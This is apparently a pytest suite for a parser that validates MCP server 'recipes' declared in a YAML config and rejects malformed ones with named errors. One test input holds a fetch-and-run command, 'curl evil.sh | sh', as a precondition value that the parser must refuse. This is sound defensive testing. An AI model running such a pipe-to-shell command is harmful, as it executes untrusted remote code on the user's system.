"""A recipe that gets past the reader is a recipe that renders.

Mirror of `src/overpower/recipes.py`, over real files in `tmp_path` — the disk
is real, always (ADR 0010).

A recipe is no longer a file: it is an entry of the `mcp:` key of the one file a
repository declares itself in (ADR 0021). So every test here goes in through
`read_written_catalog`, which is the only door, and that is the point rather than
a detour — asserting through the door is asserting what the two provenances
actually get, and there is no second entry point that could admit what this one
refuses.

The subject is one property with two halves: a well-formed recipe becomes a
value, and everything else becomes a **named** error. Never a partial
acceptance: a recipe read half-way is a server installed with half a contract,
which fails at runtime far from the cause and is the exact class the graft exists
not to commit.
"""

from __future__ import annotations

from textwrap import indent
from typing import TYPE_CHECKING

import pytest

from overpower.recipes import (
    BearerSlot,
    Check,
    CollidingSlotError,
    EnvSlot,
    ForbiddenTransportError,
    HeaderSlot,
    HttpServer,
    MalformedRecipeError,
    MismatchedSlotRoleError,
    Precondition,
    Role,
    SourcelessSubstitutionError,
    StdioServer,
    Transport,
    UnknownPreconditionCheckError,
    UnknownRecipeFieldError,
    UnknownSlotRoleError,
)
from overpower.written import read_written_catalog

if TYPE_CHECKING:
    from pathlib import Path

    from overpower.recipes import Recipe

HTTP = """\
description: "A server reached over HTTP."
transport: "http"

server:
  url: "https://mcp.example.com/mcp"
"""

STDIO = """\
description: "A server the client launches."
transport: "stdio"

server:
  command: "uvx"
  args:
    - "mcp-server-git"
    - "--repository"
    - "."
  env:
    PANEL_URL: "https://panel.example.com"
"""


def write_recipe(tmp_path: Path, name: str, text: str) -> Path:
    """One recipe, as an entry of the one written file a repository declares itself in.

    `text` is the body at column zero and is indented in here, so a test still
    composes a recipe by concatenating fragments — `f"{HTTP}\\n{slots}"` — the
    way it did when a recipe was a file of its own.
    """
    path = tmp_path / ".overpower.yaml"
    path.write_text(f"mcp:\n  {name}:\n{indent(text, '    ')}", encoding="utf-8", newline="\n")
    return path


def read_recipe(path: Path) -> Recipe:
    """The one recipe the file at `path` declares, through the one reader."""
    return read_written_catalog(path).mcps[0]


def test_an_http_recipe_becomes_a_value_carrying_its_url(tmp_path: Path) -> None:
    recipe = read_recipe(write_recipe(tmp_path, "cloudflare", HTTP))

    assert recipe.description == "A server reached over HTTP."
    assert recipe.transport is Transport.HTTP
    assert recipe.server == HttpServer(url="https://mcp.example.com/mcp")


def test_a_stdio_recipe_carries_its_command_its_args_and_its_environment(tmp_path: Path) -> None:
    """`server.env` is configuration and not a secret: it is written literally.

    The distinction came from a real server — the address of a panel is not a
    secret, and a schema that could only hold slots would refuse to write it,
    bringing the server up not knowing where to talk.
    """
    recipe = read_recipe(write_recipe(tmp_path, "coolify", STDIO))

    assert recipe.transport is Transport.STDIO
    assert recipe.server == StdioServer(
        command="uvx",
        args=("mcp-server-git", "--repository", "."),
        env={"PANEL_URL": "https://panel.example.com"},
    )


def test_the_slug_comes_from_the_key_and_never_from_a_field(tmp_path: Path) -> None:
    """Rule 8 said in the one place a recipe has: a recipe never lands, so it has no tree.

    The slug is where the declaration sits — the key under `mcp:` — and not
    something the entry declares a second time about itself.
    """
    recipe = read_recipe(write_recipe(tmp_path, "hostinger-vps", HTTP))

    assert recipe.name == "hostinger-vps"


def test_a_message_about_a_recipe_names_which_recipe(tmp_path: Path) -> None:
    """One file now holds several, so `transport` alone would cost a bisection.

    Asserted on `MalformedRecipeError` here and on `ForbiddenTransportError`
    below, which is the pair that covers both halves of the module's error
    model — the malformed and the refused.
    """
    path = write_recipe(tmp_path, "broken", 'description: "x"\ntransport: 1\n')

    with pytest.raises(MalformedRecipeError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.broken.transport"
    assert str(path) in str(refused.value)


@pytest.mark.parametrize(
    "transport",
    [
        pytest.param("sse", id="sse"),
        pytest.param("ws", id="ws"),
        pytest.param("streamable-http", id="streamable-http"),
        pytest.param("STDIO", id="wrong-case"),
    ],
)
def test_a_transport_outside_the_closed_set_is_refused_naming_it(
    tmp_path: Path, transport: str
) -> None:
    """Refused at the recipe, because the target will not refuse it.

    Measured: `type = "sse"` is an unknown field in the Codex config, silently
    swallowed, and the server then connects as streamable HTTP with no message
    and no exit code. `sse` is deprecated in the current revision of the spec and
    `ws` exists in one target only.
    """
    path = write_recipe(
        tmp_path, "odd", HTTP.replace('transport: "http"', f'transport: "{transport}"')
    )

    with pytest.raises(ForbiddenTransportError) as refused:
        read_recipe(path)

    assert refused.value.transport == transport
    assert refused.value.key == "mcp.odd.transport"
    assert "stdio, http" in str(refused.value).replace("http, stdio", "stdio, http")


@pytest.mark.parametrize(
    "field",
    [
        pytest.param('transports: "http"\n', id="typo"),
        pytest.param('targets: ["claude-code"]\n', id="targets"),
    ],
)
def test_a_field_this_version_cannot_render_is_refused_by_name(tmp_path: Path, field: str) -> None:
    """Ignoring it would install a server with half its contract, at exit 0.

    `targets` is on the list for a different reason from the rest, and it is the
    only one that will **never** arrive: which targets a recipe serves is
    derived from (transport, slot roles, target) and is a table in code — rule 4
    — so a recipe that declared one would be a recipe allowed to lie about
    itself the day a runtime gained the capability. The answer lives in
    `overpower.rendering.targets_of`; here it is refused at the door.
    """
    path = write_recipe(tmp_path, "ahead", f"{HTTP}\n{field}")

    with pytest.raises(UnknownRecipeFieldError) as refused:
        read_recipe(path)

    assert refused.value.path == path


def test_a_field_the_declared_transport_has_no_reader_for_is_refused(tmp_path: Path) -> None:
    """A `url` under `stdio` is a line to change, not a value to correct."""
    path = write_recipe(
        tmp_path,
        "mixed",
        'description: "x"\ntransport: "stdio"\n\nserver:\n  command: "uvx"\n  url: "https://x/mcp"\n',
    )

    with pytest.raises(UnknownRecipeFieldError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.mixed.server.url"


def test_the_source_token_with_no_source_to_resolve_it_is_refused_by_name(tmp_path: Path) -> None:
    """Written through literally, the server launches against a directory called `{source}`."""
    path = write_recipe(
        tmp_path,
        "homegrown",
        'description: "x"\ntransport: "stdio"\n\nserver:\n  command: "uv"\n'
        '  args: ["run", "--project", "{source}", "server.py"]\n',
    )

    with pytest.raises(SourcelessSubstitutionError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.homegrown.server.args"


# --------------------------------------------------------------------------- #
# source: code the recipe brings, cloned to the machine
# --------------------------------------------------------------------------- #

SOURCED = """\
description: "A server built from its own repository."
transport: "stdio"

source:
  url: "https://github.com/example/homegrown-mcp"

server:
  command: "uv"
  args:
    - "run"
    - "--project"
    - "{source}"
    - "server.py"
"""


def test_a_source_field_is_read_as_the_url_to_clone(tmp_path: Path) -> None:
    recipe = read_recipe(write_recipe(tmp_path, "homegrown", SOURCED))

    assert recipe.source == "https://github.com/example/homegrown-mcp"


def test_a_recipe_with_no_source_carries_none(tmp_path: Path) -> None:
    recipe = read_recipe(write_recipe(tmp_path, "cloudflare", HTTP))

    assert recipe.source is None


def test_the_source_token_with_a_source_to_resolve_it_is_admitted(tmp_path: Path) -> None:
    """This reader only admits the token — it never substitutes it.

    Resolving `{source}` into the clone's absolute path is
    `overpower.rendering.render`'s job, once (type, runtime, scope) are known;
    this module's whole concern is whether the token is even legal here.
    """
    recipe = read_recipe(write_recipe(tmp_path, "homegrown", SOURCED))

    assert recipe.server == StdioServer(
        command="uv", args=("run", "--project", "{source}", "server.py")
    )


@pytest.mark.parametrize(
    ("source", "key"),
    [
        pytest.param("", "mcp.homegrown.source", id="nothing-under-it"),
        pytest.param('  url: ""\n', "mcp.homegrown.source.url", id="empty-url"),
        pytest.param('  subdir: "."\n', "mcp.homegrown.source.subdir", id="unknown-field"),
    ],
)
def test_a_malformed_source_names_the_field(tmp_path: Path, source: str, key: str) -> None:
    """`source:` with nothing under it is the row the format made sayable.

    YAML answers `None` where TOML could only spell an empty table, so a
    declaration somebody started and did not finish is now visible — and it is
    refused naming the key, rather than read as *this recipe has no source*.
    """
    path = write_recipe(tmp_path, "homegrown", f"{HTTP}\nsource:\n{source}")

    with pytest.raises((MalformedRecipeError, UnknownRecipeFieldError)) as refused:
        read_recipe(path)

    assert refused.value.key == key


def test_a_source_that_is_not_a_table_is_refused_naming_the_field(tmp_path: Path) -> None:
    path = write_recipe(
        tmp_path,
        "homegrown",
        f'source: "https://github.com/x/y"\n{HTTP}',
    )

    with pytest.raises(MalformedRecipeError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.homegrown.source"


@pytest.mark.parametrize(
    ("text", "key"),
    [
        pytest.param(
            'transport: "http"\n\nserver:\n  url: "https://x/mcp"\n',
            "mcp.broken.description",
            id="no-description",
        ),
        pytest.param(
            'description: "x"\n\nserver:\n  url: "https://x/mcp"\n',
            "mcp.broken.transport",
            id="no-transport",
        ),
        pytest.param('description: "x"\ntransport: "http"\n', "mcp.broken.server", id="no-server"),
        pytest.param(
            'description: "x"\ntransport: "http"\n\nserver:\n  url:\n',
            "mcp.broken.server.url",
            id="url-with-nothing-under-it",
        ),
        pytest.param(
            'description: ""\ntransport: "http"\n\nserver:\n  url: "https://x/mcp"\n',
            "mcp.broken.description",
            id="empty-description",
        ),
    ],
)
def test_a_malformed_recipe_names_the_file_and_the_field(
    tmp_path: Path, text: str, key: str
) -> None:
    path = write_recipe(tmp_path, "broken", text)

    with pytest.raises((MalformedRecipeError, UnknownRecipeFieldError)) as refused:
        read_recipe(path)

    assert refused.value.key == key
    assert str(path) in str(refused.value)


# --------------------------------------------------------------------------- #
# slots: what the overpower refuses to write
# --------------------------------------------------------------------------- #

SLOTTED = """\
description: "A server the client launches, with a secret and an address."
transport: "stdio"

server:
  command: "npx"
  args:
    - "-y"
    - "@masonator/coolify-mcp@2.12.0"
  env:
    COOLIFY_BASE_URL: "https://vps.panlabs.tech"

slots:
  - name: "COOLIFY_ACCESS_TOKEN"
    role: "env"
"""
"""The real shape of the case that made the distinction necessary.

The address of a panel is **not** a secret and the token is: one arrives written
in the file, the other never does. A schema that could only hold slots would
refuse to write the address, and the server would come up not knowing where to
talk.
"""

BEARER = """\
description: "A server reached over HTTP, behind a personal access token."
transport: "http"

server:
  url: "https://api.githubcopilot.com/mcp"

slots:
  - name: "GITHUB_PAT_TOKEN"
    role: "bearer"
"""


def slot(name: str, role: str, header: str = "") -> str:
    """One entry of `slots:`, at column zero so it appends to any recipe body."""
    written = f'slots:\n  - name: "{name}"\n    role: "{role}"\n'
    return f'{written}    header: "{header}"\n' if header else written


def test_a_slot_is_read_as_a_name_and_a_role_and_never_as_a_value(tmp_path: Path) -> None:
    """The contract is logical: what a slot carries is a name, never a spelling.

    A recipe that stored `"${COOLIFY_ACCESS_TOKEN}"` would be right in one target
    and silently broken in the other two — measured, `${VAR}` reaches the server
    process raw in VS Code, and `${env:VAR}` reaches the network raw in Claude
    Code.
    """
    recipe = read_recipe(write_recipe(tmp_path, "coolify", SLOTTED))

    assert recipe.slots == (EnvSlot(name="COOLIFY_ACCESS_TOKEN"),)


def test_a_literal_and_a_slot_are_two_different_declarations(tmp_path: Path) -> None:
    """Slot is what the overpower refuses to write; `server.env` is what it writes."""
    recipe = read_recipe(write_recipe(tmp_path, "coolify", SLOTTED))

    assert recipe.server == StdioServer(
        command="npx",
        args=("-y", "@masonator/coolify-mcp@2.12.0"),
        env={"COOLIFY_BASE_URL": "https://vps.panlabs.tech"},
    )
    assert [slot.name for slot in recipe.slots] == ["COOLIFY_ACCESS_TOKEN"]


def test_a_bearer_slot_is_read_without_the_word_bearer_appearing_anywhere(
    tmp_path: Path,
) -> None:
    """The role is the datum, and the header is the renderer's business.

    It is what will let a target that assembles the header itself — Codex's
    `bearer_token_env_var` — be served from this same recipe with no new field.
    """
    recipe = read_recipe(write_recipe(tmp_path, "github", BEARER))

    assert recipe.slots == (BearerSlot(name="GITHUB_PAT_TOKEN"),)
    assert "Bearer" not in BEARER


def test_a_header_slot_names_the_header_it_fills(tmp_path: Path) -> None:
    """An arbitrary header needs two names, and only one of them is the variable."""
    recipe = read_recipe(
        write_recipe(
            tmp_path, "paneled", f"{HTTP}\n{slot('PANEL_TOKEN', 'header', 'X-Panel-Token')}"
        )
    )

    assert recipe.slots == (HeaderSlot(name="PANEL_TOKEN", header="X-Panel-Token"),)


@pytest.mark.parametrize(
    "role",
    [
        pytest.param("secret", id="invented"),
        pytest.param("ENV", id="wrong-case"),
        pytest.param("authorization", id="close-to-a-real-one"),
    ],
)
def test_a_role_outside_the_closed_set_is_refused_naming_it(tmp_path: Path, role: str) -> None:
    """A role nobody renders would install a server with the secret missing, at exit 0."""
    path = write_recipe(tmp_path, "odd", f"{HTTP}\n{slot('TOKEN', role)}")

    with pytest.raises(UnknownSlotRoleError) as refused:
        read_recipe(path)

    assert refused.value.role == role
    assert "bearer, env, header" in str(refused.value)


@pytest.mark.parametrize(
    ("recipe", "role", "header"),
    [
        pytest.param(HTTP, "env", "", id="env-over-http"),
        pytest.param(STDIO, "bearer", "", id="bearer-over-stdio"),
        pytest.param(STDIO, "header", "X-Panel-Token", id="header-over-stdio"),
    ],
)
def test_a_role_the_transport_cannot_carry_is_refused_naming_both(
    tmp_path: Path, recipe: str, role: str, header: str
) -> None:
    """The pairing is a fact of the transport and not of any one target.

    An HTTP server launches no process, so it has no environment to receive a
    variable; a stdio server makes no request, so it has no header to carry one.
    Refused here, because a recipe that gets past this module is a recipe that
    renders — and the alternative is a renderer that drops the secret in silence.
    """
    path = write_recipe(tmp_path, "mixed", f"{recipe}\n{slot('TOKEN', role, header)}")

    with pytest.raises(MismatchedSlotRoleError) as refused:
        read_recipe(path)

    assert refused.value.role is Role(role)
    assert role in str(refused.value)


@pytest.mark.parametrize(
    ("entry", "key"),
    [
        pytest.param(
            '  - name: "TOKEN"\n    role: "header"\n',
            "mcp.broken.slots[0].header",
            id="header-role-with-no-header",
        ),
        pytest.param(
            '  - name: "TOKEN"\n    role: "bearer"\n    header: "X-Panel-Token"\n',
            "mcp.broken.slots[0].header",
            id="header-on-a-role-that-names-none",
        ),
        pytest.param('  - role: "bearer"\n', "mcp.broken.slots[0].name", id="no-name"),
        pytest.param(
            '  - name: ""\n    role: "bearer"\n', "mcp.broken.slots[0].name", id="empty-name"
        ),
        pytest.param('  - name: "TOKEN"\n', "mcp.broken.slots[0].role", id="no-role"),
        pytest.param(
            '  - name: "TOKEN"\n    role: ""\n', "mcp.broken.slots[0].role", id="empty-role"
        ),
    ],
)
def test_a_malformed_slot_names_the_slot_and_the_field(
    tmp_path: Path, entry: str, key: str
) -> None:
    """`slots[0]` and not `slots`: a recipe may declare several, and only one is wrong."""
    path = write_recipe(tmp_path, "broken", f"{HTTP}\nslots:\n{entry}")

    with pytest.raises(MalformedRecipeError) as refused:
        read_recipe(path)

    assert refused.value.key == key


def test_an_unknown_field_inside_a_slot_is_refused_by_name(tmp_path: Path) -> None:
    """A slot is name, role and — for one role — the header it fills. Nothing else."""
    path = write_recipe(
        tmp_path,
        "ahead",
        f'{HTTP}\nslots:\n  - name: "TOKEN"\n    role: "bearer"\n    default: "none"\n',
    )

    with pytest.raises(UnknownRecipeFieldError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.ahead.slots[0].default"


def test_a_slot_that_is_not_a_table_is_refused_naming_the_field(tmp_path: Path) -> None:
    """A bare name is the shorthand somebody will try, and it has no role in it."""
    path = write_recipe(
        tmp_path,
        "broken",
        'description: "x"\ntransport: "http"\nslots: ["GITHUB_PAT_TOKEN"]\n\n'
        'server:\n  url: "https://mcp.example.com/mcp"\n',
    )

    with pytest.raises(MalformedRecipeError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.broken.slots[0]"


@pytest.mark.parametrize(
    ("slots", "place"),
    [
        pytest.param(
            'slots:\n  - name: "TOKEN_A"\n    role: "bearer"\n'
            '  - name: "TOKEN_B"\n    role: "bearer"\n',
            "authorization",
            id="two-bearers-one-header",
        ),
        pytest.param(
            'slots:\n  - name: "TOKEN_A"\n    role: "bearer"\n'
            '  - name: "TOKEN_B"\n    role: "header"\n    header: "authorization"\n',
            "authorization",
            id="a-header-spelling-the-one-bearer-fills",
        ),
        pytest.param(
            'slots:\n  - name: "TOKEN_A"\n    role: "header"\n    header: "X-Panel-Token"\n'
            '  - name: "TOKEN_B"\n    role: "header"\n    header: "x-panel-token"\n',
            "x-panel-token",
            id="one-header-in-two-cases",
        ),
    ],
)
def test_two_slots_that_fill_one_place_are_refused_naming_the_place(
    tmp_path: Path, slots: str, place: str
) -> None:
    """Uniqueness is of the **place**, never of the name, and that is the whole point.

    Two `bearer` slots carry two different variables and fill one header, so a
    renderer building a table would keep the last and drop the first — a secret
    gone, at exit 0, out of a file nobody reads again. HTTP field names are
    case-insensitive, so the two spellings of one header are one place too.
    """
    path = write_recipe(tmp_path, "colliding", f"{HTTP}\n{slots}")

    with pytest.raises(CollidingSlotError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.colliding.slots[1]"
    assert refused.value.place == place


@pytest.mark.parametrize(
    ("slots", "place"),
    [
        pytest.param(
            'slots:\n  - name: "API_KEY"\n    role: "header"\n    header: "X-One"\n'
            '  - name: "API-KEY"\n    role: "header"\n    header: "X-Two"\n',
            "api-key",
            id="underscore-against-dash",
        ),
        pytest.param(
            'slots:\n  - name: "API_KEY"\n    role: "header"\n    header: "X-One"\n'
            '  - name: "api_key"\n    role: "header"\n    header: "X-Two"\n',
            "api-key",
            id="two-cases-of-one-name",
        ),
    ],
)
def test_two_slots_whose_names_reach_one_prompt_are_refused_naming_the_prompt(
    tmp_path: Path, slots: str, place: str
) -> None:
    """The same lost secret as above, arriving through the **name** instead of the place.

    One measured target declares its prompts in a list beside the servers and
    refers to them by an identifier derived from the slot name — and that
    derivation is not injective: it lowercases and folds `_` to `-`, so
    `API_KEY` and `API-KEY` reach one identifier. The entries are replaced by
    that identifier, so the second declaration overwrites the first: one prompt
    is asked for, and **both** headers are filled with the answer, at exit 0.

    The places differ, so `_filled` cannot see it: `X-One` and `X-Two` are two
    real headers, and the two variables are two real variables for the other
    targets. What collides is the prompt, which is the third thing a slot
    occupies — and the same recipe therefore *diverges between targets*, asking
    for one secret in one and two in the others, where one of the two is not
    even settable by `export` in a POSIX shell.

    Refused for the reason the neighbours are: every other resolution keeps one
    declaration and drops the other, on the author's behalf, in a file they will
    not read again.
    """
    path = write_recipe(tmp_path, "colliding", f"{HTTP}\n{slots}")

    with pytest.raises(CollidingSlotError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.colliding.slots[1]"
    assert refused.value.place == place


def test_two_slots_whose_names_reach_two_prompts_are_both_kept(tmp_path: Path) -> None:
    """The other half, or the refusal above would read as *"two slots is too many"*.

    `API_KEY` and `API_SECRET` are two identifiers, two prompts and two secrets,
    and nothing overwrites anything — so there is nothing to protect the author
    from, and refusing it would be a rule with no defect behind it.
    """
    slots = (
        'slots:\n  - name: "API_KEY"\n    role: "header"\n    header: "X-One"\n'
        '  - name: "API_SECRET"\n    role: "header"\n    header: "X-Two"\n'
    )
    path = write_recipe(tmp_path, "distinct", f"{HTTP}\n{slots}")

    read = read_recipe(path)

    assert [slot.name for slot in read.slots] == ["API_KEY", "API_SECRET"]


def test_one_variable_may_fill_two_different_places(tmp_path: Path) -> None:
    """The refusal is of a lost secret, not of a repeated name.

    A server that wants the same token in two headers gets both: nothing
    overwrites anything, so there is nothing for the reader to protect the
    author from — and refusing it would be a rule with no defect behind it.
    """
    recipe = read_recipe(
        write_recipe(
            tmp_path,
            "twice",
            f'{HTTP}\nslots:\n  - name: "TOKEN"\n    role: "bearer"\n'
            '  - name: "TOKEN"\n    role: "header"\n    header: "X-Panel-Token"\n',
        )
    )

    assert recipe.slots == (
        BearerSlot(name="TOKEN"),
        HeaderSlot(name="TOKEN", header="X-Panel-Token"),
    )


def test_a_name_declared_both_as_a_secret_and_as_a_literal_is_refused(tmp_path: Path) -> None:
    """The two declarations contradict each other, and the file cannot say both.

    `server.env` means *write this value*; a slot means *never write it*. A
    reader that let both through would resolve the contradiction by overwriting
    one of them, and whichever lost would lose in silence — either the address
    never lands, or the secret does.
    """
    path = write_recipe(
        tmp_path,
        "contradictory",
        'description: "x"\ntransport: "stdio"\n\nserver:\n  command: "npx"\n'
        '  env:\n    PANEL_TOKEN: "written"\n\n'
        'slots:\n  - name: "PANEL_TOKEN"\n    role: "env"\n',
    )

    with pytest.raises(CollidingSlotError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.contradictory.slots[0]"
    assert "server.env" in str(refused.value)


def test_a_recipe_with_no_slots_at_all_carries_none(tmp_path: Path) -> None:
    """The minimal case: a URL and nothing to fill in — Cloudflare authorises in the browser."""
    recipe = read_recipe(write_recipe(tmp_path, "cloudflare", HTTP))

    assert recipe.slots == ()


def test_flow_style_reads_as_the_same_recipe_block_style_does(tmp_path: Path) -> None:
    """The single-way-to-write is gone, and it deliberately gains no mechanism (ADR 0021).

    `slots: [{name: X, role: env}]` and the same thing in block style are one
    document to any parser, and this reader works on the parsed tree. Block style
    is the convention of the house — rule 43 of the panlabs standard, where a
    rule with no mechanism is checked in review — and here there is not even a
    review, because the file belongs to whoever publishes it.

    Refusing flow style would cost a **second parser**: `yaml.safe_load` answers
    a tree and not positions, so telling the two apart means re-reading the bytes
    to buy cosmetic uniformity in somebody else's repository.
    """
    flowed = (
        '{description: "A server reached over HTTP", transport: http, '
        'server: {url: "https://mcp.example.com/mcp"}, '
        "slots: [{name: TOKEN, role: bearer}]}"
    )
    blocked = f"{HTTP}\n{slot('TOKEN', 'bearer')}"

    flow = read_recipe(write_recipe(tmp_path, "cloudflare", flowed))
    block = read_recipe(write_recipe(tmp_path, "cloudflare", blocked))

    assert flow.server == block.server
    assert flow.slots == block.slots == (BearerSlot(name="TOKEN"),)


def test_a_key_that_is_not_a_name_is_refused_the_way_the_written_file_refuses_one(
    tmp_path: Path,
) -> None:
    """TOML had no key type but string; YAML has, so the key is checked here too.

    `1:` decodes to the integer `1`, and the cast this reader used to do would
    now be a lie living in the module whose only reason to exist is being the
    type tripwire.
    """
    path = write_recipe(tmp_path, "odd", f'{HTTP}\nslots:\n  - 1: "x"\n    role: "bearer"\n')

    with pytest.raises(MalformedRecipeError) as refused:
        read_recipe(path)

    assert "slots[0]" in refused.value.key


# --------------------------------------------------------------------------- #
# preconditions: what the recipe declares, never what it runs
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    ("check", "value"),
    [
        pytest.param("command_exists", "uv", id="command_exists"),
        pytest.param("env_set", "AWS_PROFILE", id="env_set"),
        pytest.param("path_exists", "/var/run/docker.sock", id="path_exists"),
    ],
)
def test_a_precondition_is_read_as_a_check_and_a_value(
    tmp_path: Path, check: str, value: str
) -> None:
    """The closed vocabulary, each member carried through to a value."""
    recipe = read_recipe(
        write_recipe(
            tmp_path,
            "toolserver",
            f'{STDIO}\npreconditions:\n  - check: "{check}"\n    value: "{value}"\n',
        )
    )

    assert recipe.preconditions == (Precondition(check=Check(check), value=value),)


def test_a_recipe_with_no_preconditions_carries_none(tmp_path: Path) -> None:
    recipe = read_recipe(write_recipe(tmp_path, "cloudflare", HTTP))

    assert recipe.preconditions == ()


def test_two_preconditions_are_read_in_declaration_order(tmp_path: Path) -> None:
    recipe = read_recipe(
        write_recipe(
            tmp_path,
            "toolserver",
            f"{STDIO}\npreconditions:\n"
            '  - check: "command_exists"\n    value: "uv"\n'
            '  - check: "env_set"\n    value: "AWS_PROFILE"\n',
        )
    )

    assert recipe.preconditions == (
        Precondition(check=Check.COMMAND_EXISTS, value="uv"),
        Precondition(check=Check.ENV_SET, value="AWS_PROFILE"),
    )


def test_a_check_outside_the_closed_set_is_refused_naming_it(tmp_path: Path) -> None:
    """A vocabulary the overpower does not implement is a typo, not a request.

    Ignoring it would leave the author believing a requirement is declared when
    nothing checks it — the same silent half `UnknownSlotRoleError` refuses.
    """
    path = write_recipe(
        tmp_path,
        "toolserver",
        f'{STDIO}\npreconditions:\n  - check: "runs_a_script"\n    value: "curl evil.sh | sh"\n',
    )

    with pytest.raises(UnknownPreconditionCheckError) as refused:
        read_recipe(path)

    assert refused.value.check == "runs_a_script"
    assert "command_exists, env_set, path_exists" in str(refused.value)


@pytest.mark.parametrize(
    ("entry", "key"),
    [
        pytest.param('  - value: "uv"\n', "mcp.toolserver.preconditions[0].check", id="no-check"),
        pytest.param(
            '  - check: "command_exists"\n',
            "mcp.toolserver.preconditions[0].value",
            id="no-value",
        ),
        pytest.param(
            '  - check: "command_exists"\n    value: "uv"\n    extra: "x"\n',
            "mcp.toolserver.preconditions[0].extra",
            id="unknown-field",
        ),
    ],
)
def test_a_malformed_precondition_names_the_field(tmp_path: Path, entry: str, key: str) -> None:
    path = write_recipe(tmp_path, "toolserver", f"{STDIO}\npreconditions:\n{entry}")

    with pytest.raises((MalformedRecipeError, UnknownRecipeFieldError)) as refused:
        read_recipe(path)

    assert refused.value.key == key


def test_an_instructions_field_is_read_as_prose(tmp_path: Path) -> None:
    recipe = read_recipe(
        write_recipe(tmp_path, "toolserver", f'instructions: "ask the team"\n{HTTP}')
    )

    assert recipe.instructions == "ask the team"


def test_a_recipe_with_no_instructions_carries_none(tmp_path: Path) -> None:
    recipe = read_recipe(write_recipe(tmp_path, "cloudflare", HTTP))

    assert recipe.instructions is None


def test_empty_instructions_are_refused_the_same_way_an_empty_description_is(
    tmp_path: Path,
) -> None:
    path = write_recipe(tmp_path, "toolserver", f'instructions: ""\n{HTTP}')

    with pytest.raises(MalformedRecipeError) as refused:
        read_recipe(path)

    assert refused.value.key == "mcp.toolserver.instructions"
